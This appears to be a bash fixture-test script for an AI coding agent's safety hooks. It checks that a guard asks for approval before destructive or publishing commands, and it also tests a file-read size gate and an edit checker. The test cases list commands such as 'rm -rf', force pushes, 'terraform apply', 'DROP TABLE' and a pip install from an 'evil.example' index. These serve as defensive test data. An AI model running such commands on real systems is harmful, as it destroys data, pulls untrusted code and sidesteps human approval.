#!/usr/bin/env bash
# Fixture tests for the hooks in this directory: feed canned hook JSON, assert the decision.
# Run after ANY change to .claude/hooks/ or .claude/settings.json:  .claude/hooks/test-hooks.sh
# Ported from valuedocs-data-platform on 2026-09-26 with the Gradle cases swapped for Maven and
# the publishing cases (release tag, registry push, mvn deploy) added. governance-guard.sh is
# not covered here.
set -uo pipefail
here=$(cd "$(dirname "$0")" && pwd)
fail=0; n=0

guard() { # $1 = command, $2 = cwd (optional) -> prints "ask" or "pass"
  local out
  out=$(jq -n --arg c "$1" --arg d "${2:-$PWD}" '{tool_input:{command:$c}, cwd:$d}' | "$here/guard-destructive.sh")
  [ "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" = "ask" ] && echo ask || echo pass
}
expect() { # $1 = expected, $2 = actual, $3 = label
  n=$((n+1)); if [ "$1" != "$2" ]; then echo "FAIL: expected $1, got $2 — $3"; fail=1; fi
}

# A scratch repo on a feature branch, so "push while on main" depends only on the command.
tmp=$(mktemp -d); trap 'rm -rf "$tmp"' EXIT
git -C "$tmp" init -q -b feature 2>/dev/null || { git -C "$tmp" init -q && git -C "$tmp" checkout -q -b feature; }
git -C "$tmp" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init

while IFS='|' read -r want cmd; do
  [ -z "$want" ] || [ "${want:0:1}" = "#" ] && continue
  expect "$want" "$(guard "$cmd" "$tmp")" "$cmd"
done <<'CASES'
ask|git push --force origin feat
ask|git -C . push -f origin feat
ask|git push origin +feat
ask|git push --force-with-lease=feat:abc origin feat
ask|git push origin main
ask|git push origin HEAD:main
ask|git push origin --delete feat
ask|git push --tags
ask|cd x && git reset --hard origin/main
ask|git clean -fd
ask|git checkout -- .
ask|rm -rf build
ask|rm -fr /tmp/x
ask|rm -r /tmp/x
ask|rm -r -f /tmp/x
ask|rm -R dir
ask|rm --recursive dir
ask|terraform -chdir=infra apply
ask|terraform apply -auto-approve
ask|terraform -chdir=infra state rm x
ask|gcloud run jobs execute foo
ask|/usr/bin/gcloud projects list
ask|env gcloud sql instances list
ask|bq rm -t ds.t
ask|gsutil rm gs://b/o
ask|psql -c "select 1"
ask|echo "DROP TABLE judgments;" | something
ask|mvn -pl cistern-app spring-boot:run
ask|mvn -q -B deploy
ask|mvn release:prepare
ask|docker push ghcr.io/enrichmeai/cistern:0.3.0
ask|git push origin v0.3.0
ask|git push origin refs/tags/v0.3.0
ask|gh workflow run deploy.yml
ask|gh release create v1
ask|gh api -X DELETE repos/x/y/git/refs/heads/z
ask|gh api repos/x/y/issues --method POST -f t=x
ask|pip install -e git+https://example.com/x.git#egg=x
ask|pip install --index-url https://evil.example/simple x
pass|git push -u origin claude/autonomous-build-workflow-2hjbcx
pass|git push
pass|git push origin feature-main-thing
pass|git status
pass|git checkout -b feat origin/main
pass|mvn -q -B verify
pass|mvn -q -B -pl cistern-core -am test-compile
pass|mvn -q -pl cistern-wac -am test -Dtest=WacEngineTest -Dsurefire.failIfNoSpecifiedTests=false
pass|docker compose up --build
pass|git push origin claude/v2-notes
pass|rm build/tmp.txt
pass|rm -f build/tmp.txt
pass|terraform plan
pass|gh pr view 12
pass|gh api repos/x/y/pulls
pass|npm run lint
pass|grep -rn "terraform" docs
CASES

# Bare `git push` while the current branch IS main.
git -C "$tmp" checkout -q -b main 2>/dev/null || git -C "$tmp" checkout -q main
expect ask "$(guard 'git push' "$tmp")" 'git push (on main)'
expect ask "$(guard 'git push origin' "$tmp")" 'git push origin (on main)'

# post-edit-check: exit 2 on broken JSON/Python, 0 on good, 0 for files outside its scope.
pe() { jq -n --arg f "$1" '{tool_input:{file_path:$f}}' | CLAUDE_PROJECT_DIR="$tmp" "$here/post-edit-check.sh" >/dev/null 2>&1; echo $?; }
printf '{"a":1}' > "$tmp/good.json"; printf '{"a":' > "$tmp/bad.json"
printf 'x = 1\n' > "$tmp/good.py"; printf 'def f(:\n' > "$tmp/bad.py"
mkdir -p "$tmp/dir with space"; printf '{"a":' > "$tmp/dir with space/bad.json"
expect 0 "$(pe "$tmp/good.json")" 'post-edit good.json'
expect 2 "$(pe "$tmp/bad.json")" 'post-edit bad.json'
expect 0 "$(pe "$tmp/good.py")" 'post-edit good.py'
expect 2 "$(pe "$tmp/bad.py")" 'post-edit bad.py'
expect 2 "$(pe "$tmp/dir with space/bad.json")" 'post-edit path with spaces'
printf 'echo ok\n' > "$tmp/good.sh"; printf 'if then\n' > "$tmp/bad.sh"
expect 0 "$(pe "$tmp/good.sh")" 'post-edit good.sh'
expect 2 "$(pe "$tmp/bad.sh")" 'post-edit bad.sh'
expect 0 "$(pe "$tmp/missing.json")" 'post-edit deleted file'
expect 0 "$(pe "")" 'post-edit no file_path'

# stop-fast-gates: no origin/main and nothing to check -> allow the stop silently.
out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh")); rc=$?
expect "0:" "$rc:$out" 'stop hook with nothing to check'


# read-gate (ported from enrichmeai.github.io #52).
# A whole read of a text file over the limit is denied with a pointer to a slice or a
# search; a slice, a small file, a binary, a missing file and a piped cat all pass.
rg() { # $1 = tool, $2 = JSON tool_input -> "deny" or "pass"
  local out
  out=$(jq -n --arg t "$1" --argjson i "$2" --arg d "$tmp" '{tool_name:$t, tool_input:$i, cwd:$d}' \
    | (cd "$tmp" && CLAUDE_READ_GATE_LINES=350 "$here/read-gate.sh"))
  [ "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" = "deny" ] && echo deny || echo pass
}
seq 1 400 > "$tmp/big.txt"; seq 1 350 > "$tmp/edge.txt"; seq 1 20 > "$tmp/small.txt"
head -c 20000 /dev/urandom > "$tmp/blob.bin"; mkdir -p "$tmp/d s"; seq 1 400 > "$tmp/d s/big.md"
expect deny "$(rg Read "{\"file_path\":\"$tmp/big.txt\"}")" 'read-gate: whole read of 400 lines'
expect deny "$(rg Read '{"file_path":"big.txt"}')" 'read-gate: relative path, resolved from cwd'
expect deny "$(rg Read "{\"file_path\":\"$tmp/d s/big.md\"}")" 'read-gate: path with a space'
expect pass "$(rg Read "{\"file_path\":\"$tmp/edge.txt\"}")" 'read-gate: exactly the limit'
expect pass "$(rg Read "{\"file_path\":\"$tmp/small.txt\"}")" 'read-gate: small file'
expect pass "$(rg Read "{\"file_path\":\"$tmp/big.txt\",\"offset\":100,\"limit\":50}")" 'read-gate: a slice'
expect pass "$(rg Read "{\"file_path\":\"$tmp/big.txt\",\"limit\":200}")" 'read-gate: limit alone'
expect pass "$(rg Read "{\"file_path\":\"$tmp/blob.bin\"}")" 'read-gate: binary file'
expect pass "$(rg Read "{\"file_path\":\"$tmp/missing.txt\"}")" 'read-gate: missing file'
expect deny "$(rg Bash "{\"command\":\"cat $tmp/big.txt\"}")" 'read-gate: cat of a big file'
expect deny "$(rg Bash '{"command":"cat big.txt"}')" 'read-gate: cat, relative path'
expect pass "$(rg Bash "{\"command\":\"cat $tmp/big.txt | grep 7\"}")" 'read-gate: cat piped into a filter'
expect pass "$(rg Bash "{\"command\":\"cat $tmp/small.txt\"}")" 'read-gate: cat of a small file'
expect pass "$(rg Bash "{\"command\":\"head -n 50 $tmp/big.txt\"}")" 'read-gate: head is bounded'
expect pass "$(rg Bash '{"command":"git status"}')" 'read-gate: unrelated command'
# the payload's cwd decides a relative path, not the directory the hook runs in
out=$(jq -n --arg d "$tmp" '{tool_name:"Read", tool_input:{file_path:"big.txt"}, cwd:$d}' | (cd / && "$here/read-gate.sh"))
expect deny "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out")" 'read-gate: relative path from the payload cwd'
# the whole deny object, as the hooks docs specify it
expect "PreToolUse|deny|yes" "$(jq -r '[.hookSpecificOutput.hookEventName, .hookSpecificOutput.permissionDecision, (.hookSpecificOutput.permissionDecisionReason | test("400 lines.*offset and limit") | if . then "yes" else "no" end)] | join("|")' <<<"$out")" 'read-gate: deny object and reason'
expect deny "$(rg Read "{\"file_path\":\"$tmp/d s/big.md\",\"x\":1}")" 'read-gate: extra input fields ignored'
expect deny "$(rg Bash "{\"command\":\"cat -n \\\"$tmp/d s/big.md\\\"\"}")" 'read-gate: cat -n of a quoted path'
expect deny "$(rg Bash "{\"command\":\"cat -- $tmp/big.txt\"}")" 'read-gate: cat -- file'
printf '%s' "$(seq 1 351)" > "$tmp/nonl.txt"
expect deny "$(rg Read "{\"file_path\":\"$tmp/nonl.txt\"}")" 'read-gate: 351 lines, no final newline'
out=$(jq -n --arg f "$tmp/small.txt" '{tool_name:"Read", tool_input:{file_path:$f}}' | CLAUDE_READ_GATE_LINES=10 "$here/read-gate.sh")
expect deny "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out")" 'read-gate: CLAUDE_READ_GATE_LINES moves the limit'
expect "0:" "$(printf 'not json' | "$here/read-gate.sh"; echo "$?:")" 'read-gate: garbage input passes silently'
out=$(jq -n --arg f "$tmp/big.txt" '{tool_name:"Read", tool_input:{file_path:$f}}' | CLAUDE_SKIP_READ_GATE=1 "$here/read-gate.sh")
expect "" "$out" 'read-gate: CLAUDE_SKIP_READ_GATE=1 turns it off'

echo "hook tests: $n run, $([ $fail = 0 ] && echo 'all passed' || echo 'FAILURES above')"
exit $fail
